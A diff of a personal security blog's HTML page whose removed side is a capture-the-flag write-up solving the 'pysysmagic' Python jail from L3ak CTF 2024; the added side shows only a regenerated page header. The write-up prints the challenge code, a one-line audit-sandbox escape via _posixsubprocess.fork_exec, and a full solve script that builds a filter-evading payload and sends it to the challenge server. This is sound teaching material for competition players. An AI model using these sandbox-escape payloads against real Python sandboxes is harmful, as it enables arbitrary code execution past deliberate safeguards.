@@ -1,118 +1,422 @@
-<!doctype html><html lang=en><head lang=it><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='Writeup of "pysysmagic", L3ak CTF 2024: an interesting pyjail'><title>Yet Another PyJail - PySysMagic - L3ak CTF 2024 | Salvatore Abello's Blog</title>
-<meta property="og:title" content="Yet Another PyJail - PySysMagic - L3ak CTF 2024"><meta property="og:description" content='Writeup of "pysysmagic", L3ak CTF 2024: an interesting pyjail'><meta property="og:type" content="article"><meta property="og:url" content="https://blog.babelo.xyz/posts/pysysmagic/"><meta property="og:site_name" content="Salvatore Abello's Blog"><meta property="og:image" content="https://blog.babelo.xyz/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=twitter:card content="summary"><meta name=twitter:title content="Yet Another PyJail - PySysMagic - L3ak CTF 2024"><meta name=twitter:description content='Writeup of "pysysmagic", L3ak CTF 2024: an interesting pyjail'><meta name=twitter:image content="https://blog.babelo.xyz/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=keywords content="Cybersec,Writeup,pyjail"><meta property="article:published_time" content="2024-07-26T20:38:20+02:00"><meta property="article:modified_time" content="2024-07-26T20:38:20+02:00"><meta property="article:author" content="Salvatore Abello"><link rel=canonical href=https://blog.babelo.xyz/posts/pysysmagic/><link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/font.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/syntax.css><link rel=preload href=/fonts/iosevka-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/iosevka-bold.woff2 as=font type=font/woff2 crossorigin><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://blog.babelo.xyz/ aria-label="Go to homepage"><img class=icon src=/images/65adf8e914bdc50b5f5f2e8b91b68cb1_hu1eab986c664bc33c2f0e30119c16a5fa_176123_128x0_resize_q85_h2_lanczos_3.webp alt="Salvatore Abello's Blog logo"></a><div class=text><a href=https://blog.babelo.xyz/><h1>Salvatore Abello's Blog</h1></a><h2>Hacking & other stuff</h2></div></div><nav><a class=nav-link href=/><b>Home</b></a>
-|
-<a class=nav-link href=/whoami/><b>Whoami</b></a>
-|
-<a class=nav-link href=/achievements/><b>Achievements</b></a>
-|
-<a class=nav-link href=/posts/><b>Posts</b></a>
-|
-<a class=nav-link href=/cves/><b>CVEs</b></a></nav><hr></header><div id=content><main><article><h1 class=title>Yet Another PyJail - PySysMagic - L3ak CTF 2024</h1><div class=post-meta><strong><span>Posted on</span>
-<time>2024-07-26 20:38:20</time>
-</strong><span>• 924 words</span>
-<span>• 5 minute read</span><div><span>Tags:</span>
-<a href=/tags/cybersec>Cybersec</a>,
-<a href=/tags/writeup>Writeup</a>,
-<a href=/tags/pyjail>pyjail</a></div></div><div class=content><p>I partecipated to the first edition of <code>L3ak CTF</code> with <code>FoocHackz</code>. I solved this challenge, it wasn&rsquo;t hard but writing a working exploit took me at least one/two hours.</p><h2 id=index><a class=full-clickable-heading href=#index>Index</a></h2><ul><li><a href=#index>Index</a></li><li><a href=#overview>Overview</a><ul><li><a href=#source>Source</a></li><li><a href=#a-bit-of-py-magic>A bit of Py-Magic</a></li><li><a href=#obligatory-pyjail>Obligatory Pyjail</a></li><li><a href=#building-payloads-from-docs>Building payloads from docs</a></li></ul></li><li><a href=#solve>Solve</a><ul><li><a href=#flag>Flag</a></li></ul></li><li><a href=#considerations>Considerations</a></li><li><a href=#source>Source</a></li></ul><h2 id=overview><a class=full-clickable-heading href=#overview>Overview</a></h2><p>As the title of the challenge suggests, it&rsquo;s a pyjail. To be more precise, two challenges from two different CTFs were merged together</p><ul><li><code>obligatory pyjail</code> from <code>LIT CTF 2023</code></li><li><code>PyMagic</code> from <code>TCP1P CTF 2023</code></li></ul><p>So, with that in mind, let&rsquo;s take a look at the source code</p><h3 id=source><a class=full-clickable-heading href=#source>Source</a></h3><p>We&rsquo;re given a bunch of files but these are the most important ones</p><ul><li><code>audit_sandbox.c</code> a C program which uses
-<a href=https://peps.python.org/pep-0578/ rel=noopener>Audit Hooks</a>
-to implement a whitelist sandbox. The only audit events we&rsquo;re allowed to use are <code>compile</code> and <code>exec</code></li><li><code>chall.py</code> the actual challenge script</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=c1># python3.10 chall.py build</span>
-</span></span><span class=line><span class=cl><span class=c1># obligatory pyjail + PyMagic = ?</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span><span class=o>,</span> <span class=nn>sys</span>
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>distutils.core</span> <span class=kn>import</span> <span class=n>Extension</span><span class=p>,</span> <span class=n>setup</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>...</span> <span class=c1># Useless stuff</span>
-</span></span><span class=line><span class=cl>    
-</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;&gt;&gt;&gt; &#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>audit_sandbox</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>audit_sandbox</span><span class=o>.</span><span class=n>install_hook</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=k>del</span> <span class=n>audit_sandbox</span>
-</span></span><span class=line><span class=cl><span class=k>del</span> <span class=n>sys</span><span class=o>.</span><span class=n>modules</span><span class=p>[</span><span class=s2>&#34;audit_sandbox&#34;</span><span class=p>]</span>
-</span></span><span class=line><span class=cl><span class=k>del</span> <span class=n>sys</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>    <span class=o>...</span>  <span class=c1># ill be nice :)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nb>eval</span> <span class=o>=</span> <span class=nb>eval</span>
-</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s2>&#34;[()&#39;</span><span class=se>\&#34;</span><span class=s2>0123456789 ]&#34;</span><span class=p>,</span> <span class=n>code</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=p>(</span><span class=n>b</span> <span class=o>:=</span> <span class=n>__builtins__</span><span class=o>.</span><span class=vm>__dict__</span><span class=p>)</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
-</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=kc>None</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nb>eval</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=p>{</span><span class=s2>&#34;__builtins__&#34;</span><span class=p>:</span> <span class=p>{},</span> <span class=s2>&#34;_&#34;</span><span class=p>:</span> <span class=n>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class=p>})</span>
-</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Nope.&#34;</span><span class=p>)</span>
-</span></span></code></pre></div><p>A lot of things immediately catch the eye</p><ul><li>All builtin functions are <em>apparently</em> deleted except <code>eval</code> but can be accessed from the <code>__main__</code> module</li><li><code>()</code> and numbers are not allowed</li><li><code>'</code>, <code>"</code> and <code>[space]</code> are not allowed</li><li>A cool gadget called <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code> is given to us</li></ul><p>If there had been <code>exec</code> instead of <code>eval</code>, we could have used
-<a href=https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-function-calls rel=noopener>decorators</a>
-!</p><h3 id=a-bit-of-py-magic><a class=full-clickable-heading href=#a-bit-of-py-magic>A bit of Py-Magic</a></h3><p>In this case, we can use a cool trick from the <code>PyMagic</code> challenge mentioned above</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>def</span> <span class=nf>call_function</span><span class=p>(</span><span class=n>f</span><span class=p>,</span> <span class=n>arg</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[[None for _.__class_getitem__ in [</span><span class=si>{</span><span class=n>f</span><span class=si>}</span><span class=s2>]],&#34;</span>
-</span></span><span class=line><span class=cl>		<span class=sa>f</span><span class=s2>&#34;_[</span><span class=si>{</span><span class=n>arg</span><span class=si>}</span><span class=s2>]][True]&#34;</span><span class=p>)</span>
-</span></span></code></pre></div><p>Thanks to
-<a href=https://peps.python.org/pep-0560/#class-getitem rel=noopener><code>__class_getitem__</code></a>
-we&rsquo;re able to call any function without using brackets</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=p>[</span>
-</span></span><span class=line><span class=cl>    <span class=p>[</span>
-</span></span><span class=line><span class=cl>        <span class=kc>None</span> <span class=k>for</span> <span class=n>_</span><span class=o>.</span><span class=n>__class_getitem__</span> <span class=ow>in</span> <span class=p>[</span><span class=nb>int</span><span class=p>]</span> <span class=c1># Equivalent of _.__class_getitem__ = int</span>
-</span></span><span class=line><span class=cl>    <span class=p>],</span>
-</span></span><span class=line><span class=cl>    <span class=n>_</span><span class=p>[</span><span class=s1>&#39;12&#39;</span><span class=p>]</span> <span class=c1># Calling _.__class_getitem__ -&gt; int</span>
-</span></span><span class=line><span class=cl><span class=p>][</span><span class=kc>True</span><span class=p>]</span> <span class=c1># Get the return value</span>
-</span></span></code></pre></div><p>But using this method, we have limitations: we are forced to pass only one argument to a function</p><h3 id=obligatory-pyjail><a class=full-clickable-heading href=#obligatory-pyjail>Obligatory pyjail</a></h3><p>Ok now we need to bypass the audit sandbox. The file called <code>audit_sandbox.c</code> was actually <del>stolen</del> taken from <code>LIT CTF 2023</code></p><p>Let&rsquo;s just take a look the solve for <code>obligatory pyjail</code> (Credits to flocto)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=p>[</span><span class=n>lm</span><span class=o>:=</span><span class=p>()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()[</span><span class=mi>104</span><span class=p>]</span><span class=o>.</span><span class=n>load_module</span><span class=p>,</span><span class=n>p</span><span class=o>:=</span><span class=nb>__import__</span><span class=p>(</span><span class=s2>&#34;os&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>pipe</span><span class=p>,</span><span class=n>_ps</span><span class=o>:=</span><span class=n>lm</span><span class=p>(</span><span class=s2>&#34;_posixsubprocess&#34;</span><span class=p>),</span><span class=n>_ps</span><span class=o>.</span><span class=n>fork_exec</span><span class=p>([</span><span class=sa>b</span><span class=s2>&#34;/bin/cat&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;flag.txt&#34;</span><span class=p>],</span> <span class=p>[</span><span class=sa>b</span><span class=s2>&#34;/bin/cat&#34;</span><span class=p>],</span> <span class=kc>True</span><span class=p>,</span> <span class=p>(),</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=n>p</span><span class=p>()),</span> <span class=kc>False</span><span class=p>,</span> <span class=kc>False</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=kc>None</span><span class=p>)]</span>
-</span></span></code></pre></div><p>So using <code>_posixsubprocess.fork_exec</code> we bypass that sandobx. Cool, but there&rsquo;s a catch: <code>fork_exec</code> requires exactly 21 arguments. As I said before, we&rsquo;re allowed to pass exactly 1 argument using <code>_.__class_getitem__</code></p><p>And now what?</p><h2 id=building-payloads-from-docs><a class=full-clickable-heading href=#building-payloads-from-docs>Building payloads from docs</a></h2><p>I specified earlier that <code>eval</code> is not completely deleted. In fact, we can access it from the <code>__main__</code> module. Since we can&rsquo;t import anything, we can reach the <code>sys</code> module from some objects found in <code>().__class__.__base__.__subclasses()</code> andd then access to <code>eval</code> using <code>sys.modules['__main__']</code></p><p>But how can <code>eval</code> be useful to us?</p><p>Our goal is to call <code>fork_exec</code> passing to it 21 arguments. We can build payloads from scratch using docs (eg. <code>[].__doc__</code>). If some characters are not in the docs, we can get them from <code>_.__qualname__</code></p><p>So, our main idea would be:</p><ul><li>Build a payload from docs which would call <code>_posixsubprocess.fork_exec</code></li><li>Reach <code>__main__.eval</code></li><li>Call it and pass the payload as the first argument</li><li>Profit</li></ul><h2 id=solve><a class=full-clickable-heading href=#solve>Solve</a></h2><p>I copy pasted the solve for <code>PyMagic</code>, you can find it
-<a href=https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/misc/pymagic/solve_pymagic.py rel=noopener>here</a>
-(Credits to SuperStormer)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_int</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=s2>&#34;False&#34;</span>
-</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=s2>&#34;--&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=s2>&#34;True&#34;</span><span class=p>]</span> <span class=o>*</span> <span class=n>i</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>call_function</span><span class=p>(</span><span class=n>f</span><span class=p>,</span> <span class=n>arg</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[[None for _.__class_getitem__ in [</span><span class=si>{</span><span class=n>f</span><span class=si>}</span><span class=s2>]],&#34;</span>
-</span></span><span class=line><span class=cl>                <span class=sa>f</span><span class=s2>&#34;_[</span><span class=si>{</span><span class=n>arg</span><span class=si>}</span><span class=s2>]][True]&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>type_s</span> <span class=o>=</span> <span class=s2>&#34;_.__class__&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>object_s</span> <span class=o>=</span> <span class=s2>&#34;_.__base__&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>subclasses</span> <span class=o>=</span> <span class=n>call_function</span><span class=p>(</span><span class=n>type_s</span> <span class=o>+</span> <span class=s2>&#34;.__subclasses__&#34;</span><span class=p>,</span> <span class=n>object_s</span><span class=p>)</span> <span class=c1># _.__class__.__subclasses__(_.__base__)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>wrap_close</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>subclasses</span><span class=si>}</span><span class=s2>[</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=mi>137</span><span class=p>)</span><span class=si>}</span><span class=s2>]&#34;</span> <span class=c1># os._wrap_close</span>
-</span></span><span class=line><span class=cl><span class=n>os_module</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>wrap_close</span><span class=si>}</span><span class=s2>.__init__.__globals__&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class=p>:</span><span class=k>pass</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_string</span><span class=p>(</span><span class=n>string</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=n>src</span> <span class=o>=</span> <span class=p>[]</span><span class=o>.</span><span class=vm>__doc__</span><span class=o>.</span><span class=vm>__doc__</span> <span class=o>+</span> <span class=p>{}</span><span class=o>.</span><span class=vm>__doc__</span>
-</span></span><span class=line><span class=cl>    <span class=n>final</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>string</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>        <span class=n>fromdoc</span> <span class=o>=</span> <span class=p>(</span><span class=n>a</span><span class=o>:=</span><span class=n>src</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>x</span><span class=p>))</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>fromdoc</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>            <span class=n>final</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;[[].__doc__.__doc__+</span><span class=se>{{}}</span><span class=s2>.__doc__][False][</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=n>a</span><span class=p>)</span><span class=si>}</span><span class=s2>]+&#34;</span>
-</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> <span class=n>final</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;_.__qualname__[</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=n>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class=o>.</span><span class=vm>__qualname__</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>x</span><span class=p>))</span><span class=si>}</span><span class=s2>]+&#34;</span> <span class=k>if</span> <span class=n>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class=o>.</span><span class=vm>__qualname__</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=k>else</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>call_function</span><span class=p>(</span><span class=s1>&#39;_.__class__.__subclasses__&#39;</span><span class=p>,</span> <span class=s1>&#39;_.__base__&#39;</span><span class=p>)</span><span class=si>}</span><span class=s2>[</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=mi>14</span><span class=p>)</span><span class=si>}</span><span class=s2>].__doc__[True]+&#34;</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>final</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>sys_s</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;[*</span><span class=si>{</span><span class=n>os_module</span><span class=si>}</span><span class=s2>][</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span><span class=si>}</span><span class=s2>]&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>sys_modules</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>os_module</span><span class=si>}</span><span class=s2>[</span><span class=si>{</span><span class=n>sys_s</span><span class=si>}</span><span class=s2>].modules&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>main_module_s</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;[*</span><span class=si>{</span><span class=n>sys_modules</span><span class=si>}</span><span class=s2>][</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=mi>22</span><span class=p>)</span><span class=si>}</span><span class=s2>]&#34;</span>
-</span></span><span class=line><span class=cl><span class=n>eval_func</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>sys_modules</span><span class=si>}</span><span class=s2>[</span><span class=si>{</span><span class=n>main_module_s</span><span class=si>}</span><span class=s2>].eval&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>to_eval</span> <span class=o>=</span> <span class=n>build_string</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[(os_module:=().__class__.__base__.__subclasses__()[</span><span class=si>{</span><span class=n>gen_int</span><span class=p>(</span><span class=mi>137</span><span class=p>)</span><span class=si>}</span><span class=s2>].__init__.__globals__).__class__,(sys:=os_module[&#39;sys&#39;]).__class__,sys.modules[&#39;_posixsubprocess&#39;].fork_exec([f&#39;.</span><span class=se>{{</span><span class=s2>True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span class=se>}}</span><span class=s2>readflag&#39;.encode()],[f&#39;.</span><span class=se>{{</span><span class=s2>True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span class=se>}}</span><span class=s2>readflag&#39;.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module[&#39;pipe&#39;]()),False,False,None,None,None,-True,None)]&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>system_sh</span> <span class=o>=</span> <span class=n>call_function</span><span class=p>(</span><span class=n>eval_func</span><span class=p>,</span> <span class=n>to_eval</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\t</span><span class=s1>&#39;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;34.139.98.117&#34;</span><span class=p>,</span> <span class=mi>6669</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>system_sh</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</span></span></code></pre></div><p>Let&rsquo;s break it down</p><ul><li><code>gen_int</code> Since numbers cannot be used, they can be generated from booleans (eg. <code>3</code> becomes <code>True -- True -- True</code>). I used <code>--</code> instead of <code>+</code> because I couldn&rsquo;t find <code>+</code> inside the docs</li><li><code>build_string</code> <code>"</code> and <code>'</code> are not allowed so it&rsquo;s possible to build the payload from docs and from <code>_.__qualname__</code></li><li><code>call_function</code> generate the payload to call a specified function with an argument</li><li><code>subclasses</code> is the equivalent of <code>_.__class__.__subclasses__(_.__base__)</code>, which is the equivalent of <code>_.__class__.__base__.__subclasses__()</code></li><li>Access <code>os._wrap_close</code> (position 137) to recover the <code>os</code> module objects</li><li>Do the same thing for the <code>sys</code> module and then recover <code>__main__.eval</code></li><li>Build the payload which will be passed to <code>eval</code>: <code>[(os_module:=().__class__.__base__.__subclasses__()[137].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{47:c}readflag'.encode()],[f'.{47:c}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]</code></li><li>Finally, pass that payload to <code>eval</code> and proceed to send everything to the remote server</li></ul><h3 id=flag><a class=full-clickable-heading href=#flag>Flag</a></h3><p><code>L3AK{ok_so_os_wrap_close_works_with_builtin_removal_so_added_audit_sandbox_lol_689db2}</code></p><h2 id=considerations><a class=full-clickable-heading href=#considerations>Considerations</a></h2><p>This is not the intended solution. The author forgot to remove <code>eval</code> from the main module. I think the intended one is a lot smaller than mine.</p><p>What happens if all modules from <code>sys.modules</code> are removed? Is it still solvable?</p><p>At the end, it was a fun challenge to solve ❤️</p><p>Thanks to the authors for the challenge and for the CTF in general. It&rsquo;s always nice to see pyjails in CTFs!</p><h2 id=source-1><a class=full-clickable-heading href=#source-1>Source</a></h2><p>You can find the source of this challenge
-<a href=https://github.com/salvatore-abello/pyjail/tree/main/L3ak%20CTF%202024 rel=noopener>here</a></p><p><strong>P.S:</strong> Do you need a cheatsheet with many tricks to solve pyjails? If so,
-<a href=https://github.com/salvatore-abello/python-ctf-cheatsheet/ rel=noopener>click here!</a></p></div></article></main></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/salvatore-abello>Github</a>
-|
-<a href=https://www.linkedin.com/in/salvatore-abello/>Linkedin</a>
-|
-<a href=https://x.com/salvatoreabello>X</a></p><p class=copyright>Copyright © 2025. All rights deserved.</p><hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code> | <a href=/index.xml><b>RSS</b></a></footer></div></body></html>
+<!DOCTYPE html>
+<html lang="en">
+  <head lang="it"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="description" content="Writeup of &#34;pysysmagic&#34;, L3ak CTF 2024: an interesting pyjail"/><title>Yet Another PyJail - PySysMagic - L3ak CTF 2024 | Salvatore Abello&#39;s Blog</title>
+
+  <meta property="og:title"       content="Yet Another PyJail - PySysMagic - L3ak CTF 2024"/>
+  <meta property="og:description" content="Writeup of &#34;pysysmagic&#34;, L3ak CTF 2024: an interesting pyjail"/>
+  <meta property="og:type"        content="article"/>
+  <meta property="og:url"         content="http://localhost:1313/posts/pysysmagic/"/>
+  <meta property="og:site_name"   content="Salvatore Abello&#39;s Blog"/>
+  <meta property="og:image" content="http://localhost:1313/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"/>
+
+  <meta name="twitter:card"        content="summary"/>
+  <meta name="twitter:title"       content="Yet Another PyJail - PySysMagic - L3ak CTF 2024"/>
+  <meta name="twitter:description" content="Writeup of &#34;pysysmagic&#34;, L3ak CTF 2024: an interesting pyjail"/>
+  <meta name="twitter:image" content="http://localhost:1313/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"/><meta name="keywords" content="Cybersec, Writeup, pyjail"/>
+    <meta property="article:published_time" content="2024-07-26T20:38:20&#43;02:00"/>
+    <meta property="article:modified_time"  content="2024-07-26T20:38:20&#43;02:00"/>
+    <meta property="article:author" content="Salvatore Abello"/>
+
+  <link rel="canonical" href="http://localhost:1313/posts/pysysmagic/"/>
+
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+  
+
+  <link rel="preload" href="/fonts/iosevka-regular.woff2" as="font" type="font/woff2" crossorigin/>
+  <link rel="preload" href="/fonts/iosevka-bold.woff2" as="font" type="font/woff2" crossorigin/>
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color"           content="#ffffff">
+
+  
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="http://localhost:1313/" aria-label="Go to homepage">
+      <img class="icon" src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1_hu1eab986c664bc33c2f0e30119c16a5fa_176123_128x0_resize_q85_h2_lanczos_3.webp" alt="Salvatore Abello&#39;s Blog logo" />
+    </a>
+    <div class="text">
+      <a href="http://localhost:1313/"><h1>Salvatore Abello&#39;s Blog</h1></a>
